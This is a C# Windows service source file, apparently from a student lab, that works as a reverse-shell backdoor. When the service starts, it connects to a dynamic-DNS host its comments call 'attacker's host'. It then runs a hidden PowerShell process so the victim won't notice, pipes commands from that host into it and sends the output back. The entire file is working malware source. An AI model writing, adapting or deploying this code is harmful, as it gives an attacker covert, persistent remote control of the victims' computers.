using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace lab1_bai3
{
    public partial class Service1 : ServiceBase
    {
        // static stream, all class' methods can access
        static TcpClient client;
        static Stream stream;
        static StreamReader reader;
        static StreamWriter writer;
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            // connect to attacker's host
            using (client = new TcpClient("anhvuk13.duckdns.org", 12345)) {
                using (stream = client.GetStream()) {
                    using (reader = new StreamReader(stream)) {
                        using (writer = new StreamWriter(stream)) {
                            // start powershell process
                            Process p = new Process();
                            p.StartInfo.FileName = "powershell.exe";
                            // no pop up windows so victim won't know
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            // redirect stream standard input & output to manually handling
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            // add event handlers which send output to attacker
                            p.OutputDataReceived += new DataReceivedEventHandler(OutputDataHandler);
                            p.ErrorDataReceived += new DataReceivedEventHandler(ErrorDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();
                            p.BeginErrorReadLine();

                            // allocate a new string
                            StringBuilder input = new StringBuilder();
                            while (true)
                            {
                                // read from attacker's input
                                input.Append(reader.ReadLine());
                                // pass attacker's input to powershell process
                                p.StandardInput.WriteLine(input);
                                // input = ""
                                input.Remove(0, input.Length);
                            }
                        }
                    }
                }
            }
        }

        protected override void OnStop()
        {
        }

        private static void OutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            // new string
            StringBuilder output = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    // output = output from powershell process
                    output.Append(outLine.Data);
                    // send it to attacker (stream writer)
                    writer.WriteLine(output);
                    writer.Flush();
                }
                catch (Exception) { }
            }
        }

        // similar to CmdOutputDataHandler
        private static void ErrorDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder output = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    output.Append(outLine.Data);
                    writer.WriteLine(output);
                    writer.Flush();
                }
                catch (Exception) { }
            }
        }
    }
}
